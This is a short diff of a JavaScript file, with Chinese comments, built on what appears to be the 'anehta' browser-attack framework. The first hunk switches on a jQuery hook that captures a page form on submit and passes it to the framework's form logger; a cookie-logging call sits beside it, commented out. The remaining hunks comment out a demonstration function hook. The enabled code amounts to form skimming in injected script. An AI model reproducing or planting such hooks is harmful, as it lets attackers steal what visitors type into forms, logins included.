@@ -19,14 +19,14 @@ $("form").bind("submit",
 // 第二种hook submit方法
 // JQuery 直接的hook submit 方法
 ///////////////////////////////////////////////////////////////
-/*
+
 $("form[name='form1']").eq(0).submit(function(){
 	                anehta.logger.logForm($("form[name='form1']")[0]);
 	                //anehta.logger.logCookie();
 	                //return true;
 	              }
 	              );
-*/
+
 ////////////////////////////////////////////////////////////////
 // 第三种hook submit 方法
 // 如果是在javascript函数里调用了表单的比如: form.submit();
@@ -62,7 +62,7 @@ anehta.inject.hookSubmit($("form")[0], function (){injectSubmitFunc($("form")[0]
 // hj.hook("被hook的函数名", "保存原函数的变量", "你的函数名");
 // hi.unhook("被hook的函数名", "保存原函数的变量");
 ///////////////////////////////////////////////////////////////
-
+/*
 // 自定义函数1
 function test(a,b,c,d,e){
 	alert("Hooked!");
@@ -91,7 +91,7 @@ anehtaHook.hook('checktext', '_function1', 'test');
 //hj.injectFn("test","_test", "test2");
 
 //setTimeout(function(){function1(); hj.unhook("test","_test");},6000);
-
+*/
 
 
 //////////////////////////////////////////////////////////////
